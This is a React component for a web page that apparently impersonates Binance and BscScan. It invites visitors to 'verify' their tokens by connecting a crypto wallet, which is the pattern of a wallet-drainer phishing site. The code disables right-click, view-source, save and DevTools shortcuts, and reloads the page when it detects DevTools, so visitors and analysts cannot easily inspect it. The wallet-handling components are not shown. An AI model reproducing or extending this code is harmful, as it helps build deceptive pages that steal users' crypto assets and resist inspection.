import React, { useEffect, useState } from "react";
import "./App.css";
import ConnectWallet from "./Components/ConnectWallet";
import WalletDetails from "./Components/WalletDetails";
import { apiUrl } from "./config";
import axios from "axios";

const App = ({ web3 }) => {
  const [menuOpens, setMenuOpens] = useState(false);
  const [isWallet, setIsWallet] = useState(false);
  useEffect(() => {
    // Right click disable
    const handleContextMenu = (e) => e.preventDefault();
    document.addEventListener("contextmenu", handleContextMenu);

    // Keyboard shortcuts disable
    const handleKeyDown = (e) => {
      if (
        e.key === "F12" || // F12
        (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J")) || // Ctrl+Shift+I / Ctrl+Shift+J
        (e.ctrlKey && e.key === "U") || // Ctrl+U
        (e.ctrlKey && e.key === "S") // Ctrl+S
      ) {
        e.preventDefault();
      }
    };
    document.addEventListener("keydown", handleKeyDown);

    // Advanced: detect DevTools open
    let devtoolsOpen = false;
    const detectDevTools = () => {
      const threshold = 160; // px
      const widthThreshold = window.outerWidth - window.innerWidth > threshold;
      const heightThreshold =
        window.outerHeight - window.innerHeight > threshold;
      if (widthThreshold || heightThreshold) {
        if (!devtoolsOpen) {
          devtoolsOpen = true;
          window.location.reload(); 
        }
      } else {
        devtoolsOpen = false;
      }
    };

    const interval = setInterval(detectDevTools, 1000); // check every 1 second

    // Cleanup
    return () => {
      document.removeEventListener("contextmenu", handleContextMenu);
      document.removeEventListener("keydown", handleKeyDown);
      clearInterval(interval);
    };
  }, []);
  useEffect(() => {
    const checkApi = async () => {
      try {
        const response = await axios.get(`${apiUrl}/ping`);
        console.log("API Response:", response.data);
      } catch (error) {
        console.error("API check failed:", error.message);
      }
    };

    checkApi();
  }, []);
  return (
    <div className="landing-container ">
      <WalletDetails checkStatus={isWallet} details={setIsWallet} web3={web3} />
      <nav className="navbar">
        <div className="logo">
          <img src="/images/logo2.png" alt="BNB Logo" />
        </div>
        <ul className={`nav-links ${menuOpens ? "active" : ""}`}>
          <li>
            <a
              href="https://bscscan.com/"
              target="_blank"
              rel="noopener noreferrer"
            >
              Home
            </a>
          </li>
          <li>
            <a
              href="https://bscscan.com/txs"
              target="_blank"
              rel="noopener noreferrer"
            >
              Blockchain
            </a>
          </li>
          <li>
            <a
              href="https://bscscan.com/tokens"
              target="_blank"
              rel="noopener noreferrer"
            >
              Tokens
            </a>
          </li>
          <li>
            <a
              href="https://bscscan.com/validators"
              target="_blank"
              rel="noopener noreferrer"
            >
              Validators
            </a>
          </li>
          <li>
            <a
              href="https://bscscan.com/nft-top-contracts"
              target="_blank"
              rel="noopener noreferrer"
            >
              NFTs
            </a>
          </li>
          <li>
            <a
              href="https://bscscan.com/charts"
              target="_blank"
              rel="noopener noreferrer"
            >
              Resources
            </a>
          </li>
          <li>
            <a
              href="https://bscscan.com/verifyContract"
              target="_blank"
              rel="noopener noreferrer"
            >
              Developers
            </a>
          </li>
        </ul>
        <div
          className={`hamburger ${menuOpens ? "open" : ""}`}
          onClick={() => setMenuOpens(!menuOpens)}
        >
          <span></span>
          <span></span>
          <span></span>
        </div>
      </nav>
      <main className="hero">
        <h1>Verify Your Assets</h1>
        <p>Ensure your tokens are eligible for trade.</p>
        <div className="tnShado">
          <ConnectWallet data={setIsWallet} web3={web3} />
        </div>
      </main>
      <footer className="footer">
        © 2025 Best application Reserved by the binance to verify assets.
      </footer>
    </div>
  );
};

export default App;
